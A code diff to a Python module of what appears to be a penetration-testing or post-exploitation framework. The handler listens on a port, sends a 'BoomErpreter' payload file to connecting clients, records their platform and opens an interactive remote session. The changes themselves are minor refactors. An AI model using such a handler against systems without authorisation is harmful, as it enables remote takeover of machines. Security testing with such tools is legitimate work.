@@ -6,7 +6,7 @@ import time
 from module import Module
 from os import sep
 import pickle
-from extra_functions.session import Session
+from extra_functions.sessions.session import Session
 
 class BoomerModule(Module):
     def __init__(self):
@@ -24,7 +24,7 @@ class BoomerModule(Module):
     def run(self):
         # Create a TCP/IP socket
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(8)
+        sock.settimeout(14)
         # Bind the socket to the port
         server_address = (self.options["lhost"][1], int(self.options["lport"][1]))
         print('starting up on %s port %s' % server_address)
@@ -35,7 +35,7 @@ class BoomerModule(Module):
             print('waiting for a connection')
             client, client_address = sock.accept()
             try:
-                print('Sending BoomErpreter', client_address)
+                print('Sending BoomErpreter --> %s:%s' % (client_address[0], str(client_address[1])))
                 file_boomer = ("support%sboomerpreter%sboomerpreter.py" % (sep,sep))
                 meterpreter = open(file_boomer, "r").read()
                 meterpreter = meterpreter.encode()
@@ -44,8 +44,9 @@ class BoomerModule(Module):
                 c = client.send(meterpreter)
                 if c == 0:
                     return
-                print("Send --> ", c)
-                session_id = self.sessions.set_session(client)
+                print("Send %s bytes" % str(c))
+                platform = client.recv(1024)
+                session_id = self.sessions.set_session(client, platform.decode())
                 self.print_info("Session %s has been created" % str(session_id))
                 res = self.sessions.interact(session_id)
                 if res:
